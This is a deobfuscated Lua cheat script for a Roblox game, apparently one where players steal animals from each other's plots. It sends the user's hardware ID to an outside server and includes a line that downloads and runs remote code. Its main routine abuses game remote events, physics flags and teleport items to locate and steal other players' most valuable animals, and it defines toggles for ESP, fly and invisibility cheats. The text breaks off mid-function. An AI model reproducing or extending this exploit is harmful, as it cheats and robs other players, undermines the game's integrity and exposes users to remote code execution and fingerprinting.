--[[
		Deobfuscated by: @shakingspeare
		If not used, or sent by shakingspeare you WILL not USE IT
		LOVE YA BYE


]]


repeat
    task.wait()
until game:IsLoaded()

local v1_ = game:GetService("HttpService")
local v2_ = get_hwid and get_hwid() or (gethwid and gethwid() or "UNKNOWN_HWID")
local v3_ = v1_:JSONDecode(request({
    ["Url"] = "https://ver.lucasemanuelguimaraes20.workers.dev/",
    ["Method"] = "POST",
    ["Headers"] = {
        ["Content-Type"] = "application/json"
    },
    ["Body"] = v1_:JSONEncode({
        ["hwid"] = v2_
    })
}).Body)
local v_u_4_, v5_, v_u_6_, v_u_7_
if v3_.exists then
    v_u_4_ = v3_.nome
    v5_ = true
    v_u_6_ = true
    v_u_7_ = true
    if not v_u_7_ then
        v_u_7_ = false
    end
else
    v5_ = true
    v_u_6_ = true
    v_u_7_ = true
    v_u_4_ = "VisualCode4"
end

if not v5_ then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LucasggkX/Key/refs/heads/main/KeySystem.lua"))()
end


local _ = workspace.Map.Codes.Main.SurfaceGui.MainFrame.PrivateServerMessage.Visible
local v8_ = game:GetService("Players")
local v_u_9_ = game:GetService("TweenService")
game:GetService("RunService")
local v10_ = game:GetService("ReplicatedStorage")
local v_u_11_ = game:GetService("UserInputService")
local v_u_12_ = v8_.LocalPlayer
local v13_ = v_u_12_
v_u_12_.WaitForChild(v13_, "PlayerGui")
function gotoBest()
    local v14_ = game:GetService("Players")
    local v_u_15_ = game:GetService("ReplicatedStorage")
    local v_u_16_ = v14_.LocalPlayer 
    local v_u_17_ = false
    local v_u_18_ = nil
    local v_u_19_ = nil
    local v_u_20_ = nil
    local function v_u_22_()
		-- upvalues: (ref) v_u_18_, (ref) v_u_20_
        v_u_18_:UnequipTools()
        task.wait(0.1)
        local v21_ = v_u_20_:FindFirstChild("Grapple Hook")
        if not v21_ then
            return false
        end
        v_u_18_:EquipTool(v21_)
        task.wait(0.3)
        return true
    end
    local function v_u_73_()
		-- upvalues: (ref) v_u_16_
        local v23_ = workspace:FindFirstChild("Plots")
        if not v23_ then
            return nil, nil
        end
        local v24_, v25_, v26_ = ipairs(v23_:GetChildren())
        local v27_ = 0
        local v28_ = nil
        while true do
            local v29_
            v26_, v29_ = v24_(v25_, v26_)
            if v26_ == nil then
                if v28_ then
                    return v28_.Position, v28_
                else
                    return nil, nil
                end
            end
            local v30_, v31_, v32_ = ipairs(v29_:GetDescendants())
            local v33_ = false
            while true do
                local v34_
                v32_, v34_ = v30_(v31_, v32_)
                if v32_ == nil then
                    break
                end
                if v34_:IsA("TextLabel") and type(v34_.Text) == "string" and v34_.Text:find(v_u_16_.DisplayName) then
                    v33_ = true
                    break
                end
            end
            if not v33_ then
                local v35_ = v29_:FindFirstChild("AnimalPodiums")
                if v35_ then
                    local v36_, v37_, v38_ = ipairs(v35_:GetChildren())
                    while true do
                        local v39_
                        v38_, v39_ = v36_(v37_, v38_)
                        if v38_ == nil then
                            break
                        end
                        local v40_ = v39_:FindFirstChild("Base") and (v39_.Base:FindFirstChild("Spawn") and v39_.Base.Spawn:FindFirstChild("Attachment"))
                        if v40_ then
                            v40_ = v39_.Base.Spawn.Attachment:FindFirstChild("AnimalOverhead")
                        end
                        if v40_ then
                            local v41_, v42_, v43_ = ipairs(v40_:GetDescendants())
                            local v44_ = nil
                            local v45_ = nil
                            while true do
                                local v46_
                                v43_, v46_ = v41_(v42_, v43_)
                                if v43_ == nil then
                                    break
                                end
                                if v46_:IsA("TextLabel") then
                                    if v46_.Name == "Generation" then
                                        v44_ = v46_
                                    end
                                    if v46_.Name == "Stolen" then
                                        v45_ = v46_
                                    end
                                end
                            end
                            if v44_ and (v45_ and (v45_.Text == "STOLEN" or v45_.Text == "IN FUSE")) and v44_.Text and v44_.Text:find("/s") then
                                local v47_, v48_ = v44_.Text:gsub(",", ""):match("([%d%.]+)([kKmMbB]?)")
                                local v49_ = tonumber(v47_) or 0
                                if v48_ then
                                    local v50_ = v48_:lower()
                                    if v50_ == "k" then
                                        v49_ = v49_ * 1000
                                    elseif v50_ == "m" then
                                        v49_ = v49_ * 1000000
                                    elseif v50_ == "b" then
                                        v49_ = v49_ * 1000000000
                                    end
                                end
                                local v51_ = v44_.Parent
                                while v51_ and not v51_:IsA("Model") do
                                    v51_ = v51_.Parent
                                end
                                if v51_ and v27_ < v49_ then
                                    local v52_ = v51_:FindFirstChildWhichIsA("BasePart", true)
                                    if v52_ then
                                        v28_ = v52_
                                        v27_ = v49_
                                    end
                                end
                            end
                        end
                    end
                end
                local v53_, v54_, v55_ = ipairs(v29_:GetChildren())
                while true do
                    local v56_
                    v55_, v56_ = v53_(v54_, v55_)
                    if v55_ == nil then
                        break
                    end
                    if v56_:IsA("Model") then
                        local v57_, v58_, v59_ = ipairs(v56_:GetDescendants())
                        while true do
                            local v60_
                            v59_, v60_ = v57_(v58_, v59_)
                            if v59_ == nil then
                                break
                            end
                            if v60_.Name == "AnimalOverhead" then
                                local v61_, v62_, v63_ = ipairs(v60_:GetDescendants())
                                local v64_ = nil
                                local v65_ = nil
                                while true do
                                    local v66_
                                    v63_, v66_ = v61_(v62_, v63_)
                                    if v63_ == nil then
                                        break
                                    end
                                    if v66_:IsA("TextLabel") then
                                        if v66_.Name == "Generation" then
                                            v64_ = v66_
                                        end
                                        if v66_.Name == "Stolen" then
                                            v65_ = v66_
                                        end
                                    end
                                end
                                if v64_ and (v65_ and (v65_.Text == "STOLEN" or v65_.Text == "IN FUSE")) and v64_.Text and v64_.Text:find("/s") then
                                    local v67_, v68_ = v64_.Text:gsub(",", ""):match("([%d%.]+)([kKmMbB]?)")
                                    local v69_ = tonumber(v67_) or 0
                                    if v68_ then
                                        local v70_ = v68_:lower()
                                        if v70_ == "k" then
                                            v69_ = v69_ * 1000
                                        elseif v70_ == "m" then
                                            v69_ = v69_ * 1000000
                                        elseif v70_ == "b" then
                                            v69_ = v69_ * 1000000000
                                        end
                                    end
                                    local v71_ = v64_.Parent
                                    while v71_ and not v71_:IsA("Model") do
                                        v71_ = v71_.Parent
                                    end
                                    if v71_ and v27_ < v69_ then
                                        local v72_ = v71_:FindFirstChildWhichIsA("BasePart", true)
                                        if v72_ then
                                            v28_ = v72_
                                            v27_ = v69_
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            task.wait(0.01)
        end
    end
    local function v_u_81_()
		-- upvalues: (ref) v_u_16_, (ref) v_u_15_
        pcall(function()
            setfflag("WorldStepMax", "-99999999999999")
        end)
        local v74_ = v_u_16_:WaitForChild("Backpack")
        local v75_ = v_u_16_.Character or v_u_16_.CharacterAdded:Wait()
        local v76_ = v75_:WaitForChild("Humanoid")
        local v77_ = v74_:FindFirstChild("Quantum Cloner") or v75_:FindFirstChild("Quantum Cloner")
        if v77_ then
            if v75_:FindFirstChild(v77_.Name) ~= v77_ then
                v76_:EquipTool(v77_)
            end
            local v78_ = v_u_15_:WaitForChild("Packages", 5)
            if v78_ then
                v78_ = v78_:FindFirstChild("Net")
            end
            if v78_ then
                local v79_ = v78_:FindFirstChild("RE/UseItem")
                local v80_ = v78_:FindFirstChild("RE/QuantumCloner/OnTeleport")
                if v79_ and v80_ then
                    v79_:FireServer()
                    v80_:FireServer()
                end
                task.spawn(function()
                    task.wait(3.5)
                    pcall(function()
                        setfflag("WorldStepMax", "0")
                    end)
                end)
            end
        else
            return
        end
    end
    local function v_u_87_()
		-- upvalues: (ref) v_u_17_, (ref) v_u_16_, (ref) v_u_19_, (ref) v_u_18_, (ref) v_u_15_
        task.spawn(function()
			-- upvalues: (ref) v_u_17_, (ref) v_u_16_, (ref) v_u_19_, (ref) v_u_18_
            while not v_u_17_ do
                local v82_ = v_u_16_.Character
                local v_u_83_ = v_u_18_
                if v82_ and (v_u_19_ and v_u_83_) then
                    local v84_ = v_u_16_:FindFirstChild("Backpack")
                    local v_u_85_ = v84_ and (not v82_:FindFirstChild("Grapple Hook") and v84_:FindFirstChild("Grapple Hook"))
                    if v_u_85_ then
                        pcall(function()
							-- upvalues: (ref) v_u_83_, (ref) v_u_85_
                            v_u_83_:EquipTool(v_u_85_)
                        end)
                    end
                end
                task.wait(0.05)
            end
        end)
        task.spawn(function()
			-- upvalues: (ref) v_u_17_, (ref) v_u_15_
            while not v_u_17_ do
                pcall(function()
					-- upvalues: (ref) v_u_15_
                    local v86_ = v_u_15_:FindFirstChild("Packages")
                    if v86_ then
                        require(v86_:WaitForChild("Net")):RemoteEvent("UseItem"):FireServer(1.9832406361897787)
                    end
                end)
                task.wait(0.05)
            end
        end)
    end
    local function v98_()
		-- upvalues: (ref) v_u_16_, (ref) v_u_18_, (ref) v_u_19_, (ref) v_u_20_, (ref) v_u_22_, (ref) v_u_73_, (ref) v_u_87_, (ref) v_u_17_, (ref) v_u_81_
        local v88_ = v_u_16_.Character or v_u_16_.CharacterAdded:Wait()
        task.wait(0.35)
        v_u_18_ = v88_:WaitForChild("Humanoid")
        v_u_19_ = v88_:WaitForChild("HumanoidRootPart")
        v_u_20_ = v_u_16_:WaitForChild("Backpack")
        if not v_u_22_() then
            return false
        end
        local v89_, v_u_90_ = v_u_73_()
        if not (v89_ and v_u_90_) then
            return false
        end
        local v91_ = {
            - 465,
            - 353
        }
        local v92_ = v91_[1]
        local v93_ = 165
        for v94_ = 1, # v91_ do
            if math.abs(v_u_90_.Position.X - v91_[v94_]) < math.abs(v_u_90_.Position.X - v92_) then
                v92_ = v91_[v94_]
            end
        end
        local v95_ = v_u_90_.Position.Y
        local v96_ = Vector3.new(v92_, v95_, v89_.Z)
        v_u_87_()
        task.wait(0.15)
        if v_u_19_.Position.Y < 10 then
            while v_u_19_.Position.Y < 10 do
                v_u_19_.Velocity = Vector3.new(0, v93_, 0)
                task.wait(0.03)
            end
        end
        while (v_u_19_.Position - v96_).Magnitude > 2 do
            v_u_19_.Velocity = (v96_ - v_u_19_.Position).Unit * v93_
            task.wait(0.03)
        end
        v_u_19_.Velocity = Vector3.new(0, 0, 0)
        local v97_ = tick()
        while tick() - v97_ < 0.2 do
            v_u_19_.Velocity = (v_u_90_.Position - v_u_19_.Position).Unit * v93_
            task.wait(0.03)
        end
        v_u_19_.Velocity = Vector3.new(0, 0, 0)
        pcall(function()
			-- upvalues: (ref) v_u_18_, (ref) v_u_90_
            v_u_18_:MoveTo(v_u_90_.Position)
        end)
        task.wait(0.4)
        v_u_17_ = true
        v_u_18_:UnequipTools()
        task.wait(0.2)
        pcall(function()
			-- upvalues: (ref) v_u_81_
            v_u_81_()
        end)
        task.wait(0.4)
        pcall(function()
			-- upvalues: (ref) v_u_18_, (ref) v_u_90_
            v_u_18_:MoveTo(v_u_90_.Position)
        end)
        return true
    end
    local function v193_()
		-- upvalues: (ref) v_u_16_, (ref) v_u_15_
        local v_u_99_ = v_u_16_.Character or v_u_16_.CharacterAdded:Wait()
        local v100_ = v_u_99_
        local v_u_101_ = v_u_99_.WaitForChild(v100_, "Humanoid")
        local v102_ = v_u_99_
        local v_u_103_ = v_u_99_.WaitForChild(v102_, "HumanoidRootPart")
        local v_u_104_ = v_u_16_:WaitForChild("Backpack")
        local v_u_105_ = {}
        local v_u_106_ = false
        local function v108_()
			-- upvalues: (ref) v_u_101_, (ref) v_u_104_
            v_u_101_:UnequipTools()
            task.wait(0.1)
            local v107_ = v_u_104_:FindFirstChild("Grapple Hook")
            if not v107_ then
                return false
            end
            v_u_101_:EquipTool(v107_)
            task.wait(0.3)
            return true
        end
        local function v116_()
			-- upvalues: (ref) v_u_106_, (ref) v_u_99_, (ref) v_u_103_, (ref) v_u_101_, (ref) v_u_16_, (ref) v_u_15_, (ref) v_u_105_
            local v113_ = task.spawn(function()
				-- upvalues: (ref) v_u_106_, (ref) v_u_99_, (ref) v_u_103_, (ref) v_u_101_, (ref) v_u_16_
                while not v_u_106_ do
                    local v109_ = v_u_99_
                    local v_u_110_ = v_u_101_
                    if v109_ and (v_u_103_ and v_u_110_) then
                        local v111_ = v_u_16_:FindFirstChild("Backpack")
                        local v_u_112_ = v111_ and (not v109_:FindFirstChild("Grapple Hook") and v111_:FindFirstChild("Grapple Hook"))
                        if v_u_112_ then
                            pcall(function()
								-- upvalues: (ref) v_u_110_, (ref) v_u_112_
                                v_u_110_:EquipTool(v_u_112_)
                            end)
                        end
                    end
                    task.wait(0.05)
                end
            end)
            local v115_ = task.spawn(function()
				-- upvalues: (ref) v_u_106_, (ref) v_u_15_
                while not v_u_106_ do
                    pcall(function()
						-- upvalues: (ref) v_u_15_
                        local v114_ = v_u_15_:FindFirstChild("Packages")
                        if v114_ then
                            require(v114_:WaitForChild("Net")):RemoteEvent("UseItem"):FireServer(1.9832406361897787)
                        end
                    end)
                    task.wait(0.05)
                end
            end)
            table.insert(v_u_105_, v113_)
            table.insert(v_u_105_, v115_)
        end
        local function v121_()
			-- upvalues: (ref) v_u_106_, (ref) v_u_105_
            v_u_106_ = true
            local v117_, v118_, v119_ = ipairs(v_u_105_)
            while true do
                local v_u_120_
                v119_, v_u_120_ = v117_(v118_, v119_)
                if v119_ == nil then
                    break
                end
                pcall(function()
					-- upvalues: (ref) v_u_120_
                    task.cancel(v_u_120_)
                end)
            end
            v_u_105_ = {}
        end
        local function v_u_129_()
			-- upvalues: (ref) v_u_16_, (ref) v_u_15_
            pcall(function()
                setfflag("WorldStepMax", "-99999999999999")
            end)
            local v122_ = v_u_16_:WaitForChild("Backpack")
            local v123_ = v_u_16_.Character or v_u_16_.CharacterAdded:Wait()
            local v124_ = v123_:WaitForChild("Humanoid")
            local v125_ = v122_:FindFirstChild("Quantum Cloner") or v123_:FindFirstChild("Quantum Cloner")
            if v125_ then
                if v123_:FindFirstChild(v125_.Name) ~= v125_ then
                    v124_:EquipTool(v125_)
                end
                local v126_ = v_u_15_:WaitForChild("Packages", 5)
                if v126_ then
                    v126_ = v126_:FindFirstChild("Net")
                end
                if v126_ then
                    local v127_ = v126_:FindFirstChild("RE/UseItem")
                    local v128_ = v126_:FindFirstChild("RE/QuantumCloner/OnTeleport")
                    if v127_ and v128_ then
                        v127_:FireServer()
                        v128_:FireServer()
                    end
                    task.spawn(function()
                        task.wait(3.5)
                        pcall(function()
                            setfflag("WorldStepMax", "0")
                        end)
                    end)
                end
            else
                return
            end
        end
        local v180_, v_u_181_ = (function()
			-- upvalues: (ref) v_u_16_
            local v130_ = workspace:FindFirstChild("Plots")
            if not v130_ then
                return nil
            end
            local v131_, v132_, v133_ = ipairs(v130_:GetChildren())
            local v134_ = 0
            local v135_ = nil
            while true do
                local v136_
                v133_, v136_ = v131_(v132_, v133_)
                if v133_ == nil then
                    if v135_ then
                        return v135_.Position, v135_
                    else
                        return nil, nil
                    end
                end
                local v137_, v138_, v139_ = ipairs(v136_:GetDescendants())
                local v140_ = false
                while true do
                    local v141_
                    v139_, v141_ = v137_(v138_, v139_)
                    if v139_ == nil then
                        break
                    end
                    if v141_:IsA("TextLabel") and type(v141_.Text) == "string" and v141_.Text:find(v_u_16_.DisplayName) then
                        v140_ = true
                        break
                    end
                end
                if not v140_ then
                    local v142_ = v136_:FindFirstChild("AnimalPodiums")
                    if v142_ then
                        local v143_, v144_, v145_ = ipairs(v142_:GetChildren())
                        while true do
                            local v146_
                            v145_, v146_ = v143_(v144_, v145_)
                            if v145_ == nil then
                                break
                            end
                            local v147_ = v146_:FindFirstChild("Base") and (v146_.Base:FindFirstChild("Spawn") and v146_.Base.Spawn:FindFirstChild("Attachment"))
                            if v147_ then
                                v147_ = v146_.Base.Spawn.Attachment:FindFirstChild("AnimalOverhead")
                            end
                            if v147_ then
                                local v148_, v149_, v150_ = ipairs(v147_:GetDescendants())
                                local v151_ = nil
                                local v152_ = nil
                                while true do
                                    local v153_
                                    v150_, v153_ = v148_(v149_, v150_)
                                    if v150_ == nil then
                                        break
                                    end
                                    if v153_:IsA("TextLabel") then
                                        if v153_.Name == "Generation" then
                                            v151_ = v153_
                                        end
                                        if v153_.Name == "Stolen" then
                                            v152_ = v153_
                                        end
                                    end
                                end
                                if v151_ and (v152_ and (v152_.Text == "STOLEN" or v152_.Text == "IN FUSE")) and v151_.Text and v151_.Text:find("/s") then
                                    local v154_, v155_ = v151_.Text:gsub(",", ""):match("([%d%.]+)([kKmMbB]?)")
                                    local v156_ = tonumber(v154_) or 0
                                    if v155_ then
                                        local v157_ = v155_:lower()
                                        if v157_ == "k" then
                                            v156_ = v156_ * 1000
                                        elseif v157_ == "m" then
                                            v156_ = v156_ * 1000000
                                        elseif v157_ == "b" then
                                            v156_ = v156_ * 1000000000
                                        end
                                    end
                                    local v158_ = v151_.Parent
                                    while v158_ and not v158_:IsA("Model") do
                                        v158_ = v158_.Parent
                                    end
                                    if v158_ and v134_ < v156_ then
                                        local v159_ = v158_:FindFirstChildWhichIsA("BasePart", true)
                                        if v159_ then
                                            v135_ = v159_
                                            v134_ = v156_
                                        end
                                    end
                                end
                            end
                        end
                    end
                    local v160_, v161_, v162_ = ipairs(v136_:GetChildren())
                    while true do
                        local v163_
                        v162_, v163_ = v160_(v161_, v162_)
                        if v162_ == nil then
                            break
                        end
                        if v163_:IsA("Model") then
                            local v164_, v165_, v166_ = ipairs(v163_:GetDescendants())
                            while true do
                                local v167_
                                v166_, v167_ = v164_(v165_, v166_)
                                if v166_ == nil then
                                    break
                                end
                                if v167_.Name == "AnimalOverhead" then
                                    local v168_, v169_, v170_ = ipairs(v167_:GetDescendants())
                                    local v171_ = nil
                                    local v172_ = nil
                                    while true do
                                        local v173_
                                        v170_, v173_ = v168_(v169_, v170_)
                                        if v170_ == nil then
                                            break
                                        end
                                        if v173_:IsA("TextLabel") then
                                            if v173_.Name == "Generation" then
                                                v171_ = v173_
                                            end
                                            if v173_.Name == "Stolen" then
                                                v172_ = v173_
                                            end
                                        end
                                    end
                                    if v171_ and (v172_ and (v172_.Text == "STOLEN" or v172_.Text == "IN FUSE")) and v171_.Text and v171_.Text:find("/s") then
                                        local v174_, v175_ = v171_.Text:gsub(",", ""):match("([%d%.]+)([kKmMbB]?)")
                                        local v176_ = tonumber(v174_) or 0
                                        if v175_ then
                                            local v177_ = v175_:lower()
                                            if v177_ == "k" then
                                                v176_ = v176_ * 1000
                                            elseif v177_ == "m" then
                                                v176_ = v176_ * 1000000
                                            elseif v177_ == "b" then
                                                v176_ = v176_ * 1000000000
                                            end
                                        end
                                        local v178_ = v171_.Parent
                                        while v178_ and not v178_:IsA("Model") do
                                            v178_ = v178_.Parent
                                        end
                                        if v178_ and v134_ < v176_ then
                                            local v179_ = v178_:FindFirstChildWhichIsA("BasePart", true)
                                            if v179_ then
                                                v135_ = v179_
                                                v134_ = v176_
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end)()
        if not (v180_ and v_u_181_) then
            return false
        end
        if not v108_() then
            return false
        end
        v116_()
        local v182_ = v_u_181_.Position.Y + 15
        local v183_ = v_u_104_
        local v_u_184_ = v_u_101_
        local v185_ = 80
        while math.abs(v_u_103_.Position.Y - v182_) > 2 do
            local v186_ = v182_ - v_u_103_.Position.Y
            local v187_ = math.clamp(v186_ * 6, - v185_, v185_)
            v_u_103_.Velocity = Vector3.new(0, v187_, 0)
            task.wait(0.03)
        end
        v_u_103_.Velocity = Vector3.new(0, 0, 0)
        v121_()
        v_u_184_:UnequipTools()
        local v188_ = v183_:FindFirstChild("Flying Carpet") or v183_:FindFirstChild("Witch\'s Broom")
        if v188_ then
            v_u_184_:EquipTool(v188_)
        end
        task.wait(0.01)
        local v189_ = {
            - 343,
            - 476
        }
        local v190_ = v189_[1]
        local v191_ = v_u_103_
        for v192_ = 1, # v189_ do
            if math.abs(v_u_181_.Position.X - v189_[v192_]) < math.abs(v_u_181_.Position.X - v190_) then
                v190_ = v189_[v192_]
            end
        end
        v191_.CFrame = CFrame.new(v190_, v_u_181_.Position.Y + 15, v_u_181_.Position.Z)
        task.wait(0.2)
        v_u_184_:MoveTo(v_u_181_.Position)
        v_u_184_:UnequipTools()
        task.wait(0.5)
        pcall(function()
			-- upvalues: (ref) v_u_129_
            v_u_129_()
        end)
        task.wait(0.4)
        pcall(function()
			-- upvalues: (ref) v_u_184_, (ref) v_u_181_
            v_u_184_:MoveTo(v_u_181_.Position)
        end)
        return true
    end
    local v194_
    if (function()
        local v195_ = game:GetService("Players").LocalPlayer
        local v196_ = v195_.Character or v195_.CharacterAdded:Wait()
        local v197_ = v195_:WaitForChild("Backpack")
        return v196_:FindFirstChild("Flying Carpet") or v197_:FindFirstChild("Flying Carpet") or (v196_:FindFirstChild("Witch\'s Broom") or v197_:FindFirstChild("Witch\'s Broom"))
    end)() then
        v194_ = v193_()
    else
        v194_ = v98_()
    end
    return v194_
end
_G.activeGuis = {
    ["control"] = false
}
_G.Joiner = {
    ["State"] = false,
    ["Min"] = 10000000,
    ["Max"] = 29999999,
    ["Exec"] = false,
    ["gotoBest"] = false
}
_G.superJump = false
_G.additionalSpeed = false
_G.ativo = false
_G.FloatV1 = false
_G.FloatV2 = false
_G.bestESP = false
_G.upstairs = false
_G.SemiInv = false
_G.PlayerESP = false
_G.BaseESP = false
_G.Fly = false
_G.AntiRag = false
_G.FpsDev = false
_G.KillGui = false
_G.KickOnSteal = false
_G.LaserCape = false
_G.Delivery = false
_G.DestroySentry = false
_G.FlySpeed = 140
_G.LaserRange = 50
_G.PermUsar = true
_G.AutoCollect = false
_G.DelayCollect = 30
_G.AutobuyMin = 0
_G.AutobuyEnable = false
_G.PlayerESPColor = Color3.fromRGB(0, 255, 0)
local v_u_198_ = {}
local v_u_199_ = {}
local v_u_200_ = {}
function buy(p201_)
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RF/CoinsShopService/RequestBuy"):InvokeServer(p201_)
end
function _G.setupGuis()
	-- upvalues: (ref) v_u_11_, (ref) v_u_9_, (ref) v_u_6_, (ref) v_u_7_, (ref) v_u_12_, (ref) v_u_4_
    local v_u_202_ = v_u_11_.TouchEnabled
    local v_u_203_ = v_u_11_
    local v_u_204_ = game:GetService("RunService")
    local v_u_205_ = game:GetService("Players")
    local v206_ = v_u_205_.LocalPlayer
    local v_u_207_ = game:GetService("HttpService")
    local v_u_208_ = v206_:WaitForChild("PlayerGui")
    local v_u_209_ = v_u_9_
    local v_u_210_ = game:GetService("TeleportService")
    local v_u_227_ = {
        ["ConfigPath"] = "LKZ_Config_V2.json",
        ["Configs"] = {},
        ["LoadConfig"] = function(p_u_211_)
			-- upvalues: (ref) v_u_207_
            if readfile then
                local v212_, v_u_213_ = pcall(function()
					-- upvalues: (ref) p_u_211_
                    return readfile(p_u_211_.ConfigPath)
                end)
                if v212_ and (v_u_213_ and v_u_213_ ~= "") then
                    local v214_, v215_ = pcall(function()
						-- upvalues: (ref) v_u_207_, (ref) v_u_213_
                        return v_u_207_:JSONDecode(v_u_213_)
                    end)
                    if v214_ then
                        p_u_211_.Configs = v215_
                        return p_u_211_.Configs
                    end
                end
            end
            p_u_211_.Configs = {}
            return p_u_211_.Configs
        end,
        ["SaveConfig"] = function(p_u_216_)
			-- upvalues: (ref) v_u_207_
            if writefile then
                pcall(function()
					-- upvalues: (ref) p_u_216_, (ref) v_u_207_
                    local v217_ = v_u_207_
                    writefile(p_u_216_.ConfigPath, v217_:JSONEncode(p_u_216_.Configs))
                end)
            end
        end,
        ["ClearConfig"] = function(p_u_218_)
            p_u_218_.Configs = {}
            if writefile then
                pcall(function()
					-- upvalues: (ref) p_u_218_
                    writefile(p_u_218_.ConfigPath, "{}")
                end)
            end
        end,
        ["SetValue"] = function(p219_, p220_, p221_, p222_)
            if not p219_.Configs[p220_] then
                p219_.Configs[p220_] = {}
            end
            p219_.Configs[p220_][p221_] = p222_
            p219_:SaveConfig()
        end,
        ["GetValue"] = function(p223_, p224_, p225_, p226_)
            if p223_.Configs[p224_] and p223_.Configs[p224_][p225_] ~= nil then
                return p223_.Configs[p224_][p225_]
            else
                return p226_
            end
        end
    }
    local v228_ = v_u_227_
    v_u_227_.LoadConfig(v228_)
    local v_u_229_ = {
        ["PRIMARY"] = Color3.fromRGB(70, 130, 255),
        ["SECONDARY"] = Color3.fromRGB(70, 130, 255),
        ["BACKGROUND"] = Color3.fromRGB(20, 20, 30),
        ["FRAME_BG"] = Color3.fromRGB(30, 30, 40),
        ["TEXT"] = Color3.fromRGB(255, 255, 255),
        ["TEXT_DIM"] = Color3.fromRGB(180, 180, 180),
        ["TOGGLE_ON"] = Color3.fromRGB(70, 130, 255),
        ["TOGGLE_OFF"] = Color3.fromRGB(60, 60, 70)
    }
    local v_u_230_ = {}
    local function v_u_236_()
		-- upvalues: (ref) v_u_230_, (ref) v_u_209_
        local v231_, v232_, v233_ = ipairs(v_u_230_)
        while true do
            local v234_
            v233_, v234_ = v231_(v232_, v233_)
            if v233_ == nil then
                break
            end
            if v234_ and v234_.Parent then
                local v235_ = UDim2.new(1, - 330, 1, - 20 - v233_ * 90)
                v_u_209_:Create(v234_, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                    ["Position"] = v235_
                }):Play()
            end
        end
    end
    local function v_u_250_(p237_, p238_, p_u_239_)
		-- upvalues: (ref) v_u_208_, (ref) v_u_229_, (ref) v_u_230_, (ref) v_u_236_, (ref) v_u_209_
        local v_u_240_ = Instance.new("ScreenGui")
        v_u_240_.Name = "Notification"
        v_u_240_.Parent = v_u_208_
        v_u_240_.ResetOnSpawn = false
        v_u_240_.DisplayOrder = 999999
        local v_u_241_ = Instance.new("Frame")
        v_u_241_.Size = UDim2.new(0, 320, 0, 80)
        v_u_241_.Position = UDim2.new(1, 10, 1, - 20)
        v_u_241_.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
        v_u_241_.BorderSizePixel = 0
        v_u_241_.Parent = v_u_240_
        Instance.new("UICorner", v_u_241_).CornerRadius = UDim.new(0, 12)
        local v242_ = Instance.new("UIStroke", v_u_241_)
        v242_.Thickness = 2
        v242_.Color = v_u_229_.PRIMARY
        local v243_ = Instance.new("TextLabel", v_u_241_)
        v243_.Size = UDim2.new(1, - 10, 0, 25)
        v243_.Position = UDim2.new(0, 5, 0, 5)
        v243_.BackgroundTransparency = 1
        v243_.Text = p237_
        v243_.TextColor3 = v_u_229_.PRIMARY
        v243_.TextSize = 14
        v243_.Font = Enum.Font.GothamBold
        v243_.TextXAlignment = Enum.TextXAlignment.Left
        local v244_ = Instance.new("TextLabel", v_u_241_)
        v244_.Size = UDim2.new(1, - 10, 0, 45)
        v244_.Position = UDim2.new(0, 5, 0, 30)
        v244_.BackgroundTransparency = 1
        v244_.Text = p238_
        v244_.TextColor3 = Color3.fromRGB(255, 255, 255)
        v244_.TextSize = 12
        v244_.Font = Enum.Font.Gotham
        v244_.TextXAlignment = Enum.TextXAlignment.Left
        v244_.TextWrapped = true
        table.insert(v_u_230_, v_u_241_)
        v_u_236_()
        v_u_209_:Create(v_u_241_, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            ["Position"] = UDim2.new(1, - 330, 1, - 20 - # v_u_230_ * 90)
        }):Play()
        task.spawn(function()
			-- upvalues: (ref) p_u_239_, (ref) v_u_230_, (ref) v_u_241_, (ref) v_u_209_, (ref) v_u_240_, (ref) v_u_236_
            task.wait(p_u_239_ or 5)
            local v245_, v246_, v247_ = ipairs(v_u_230_)
            while true do
                local v248_
                v247_, v248_ = v245_(v246_, v247_)
                if v247_ == nil then
                    break
                end
                if v248_ == v_u_241_ then
                    table.remove(v_u_230_, v247_)
                    break
                end
            end
            local v249_ = v_u_209_:Create(v_u_241_, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
                ["Position"] = UDim2.new(1, 10, 1, - 20)
            })
            v249_:Play()
            v249_.Completed:Connect(function()
				-- upvalues: (ref) v_u_240_, (ref) v_u_236_
                v_u_240_:Destroy()
                v_u_236_()
            end)
        end)
    end
    local v_u_251_ = {}
    local v_u_252_ = {}
    local v_u_253_ = false
    local v_u_254_ = nil
    local v255_ = v_u_227_
    local v_u_256_ = v_u_227_.GetValue(v255_, "Global", "Keybinds", {})
    local v_u_257_ = nil
    (function()
		-- upvalues: (ref) v_u_203_, (ref) v_u_253_, (ref) v_u_254_, (ref) v_u_256_, (ref) v_u_251_, (ref) v_u_257_, (ref) v_u_250_, (ref) v_u_252_, (ref) v_u_227_
        v_u_203_.InputBegan:Connect(function(p258_, p259_)
			-- upvalues: (ref) v_u_253_, (ref) v_u_254_, (ref) v_u_256_, (ref) v_u_251_, (ref) v_u_257_, (ref) v_u_250_, (ref) v_u_252_, (ref) v_u_227_
            if p259_ then
                return
            end
            if v_u_253_ and (v_u_254_ and p258_.KeyCode ~= Enum.KeyCode.Unknown) then
                local v260_ = v_u_254_.Name
                local v261_ = p258_.KeyCode.Name
                local v262_ = v_u_256_[v260_]
                if v261_ ~= "None" then
                    local v263_, v264_, v265_ = pairs(v_u_256_)
                    while true do
                        local v266_
                        v265_, v266_ = v263_(v264_, v265_)
                        if v265_ == nil then
                            break
                        end
                        if v266_ == v261_ and v265_ ~= v260_ then
                            v_u_256_[v265_] = "None"
                            if v_u_251_[v261_] then
                                v_u_251_[v261_] = nil
                            end
                            local v267_ = v_u_257_ and v_u_257_:FindFirstChild(v265_ .. "KeybindOuter", true)
                            if v267_ then
                                local v268_ = v267_:FindFirstChild("Inner")
                                local v269_ = v268_ and v268_:FindFirstChild(v265_)
                                if v269_ then
                                    v269_.Text = "Keybind: -"
                                end
                            end
                            v_u_250_("Keybind", "Unbound \'" .. v261_ .. "\' from " .. v265_, 2)
                            break
                        end
                    end
                end
                if v262_ and v_u_251_[v262_] then
                    v_u_251_[v262_] = nil
                end
                if v261_ == "None" then
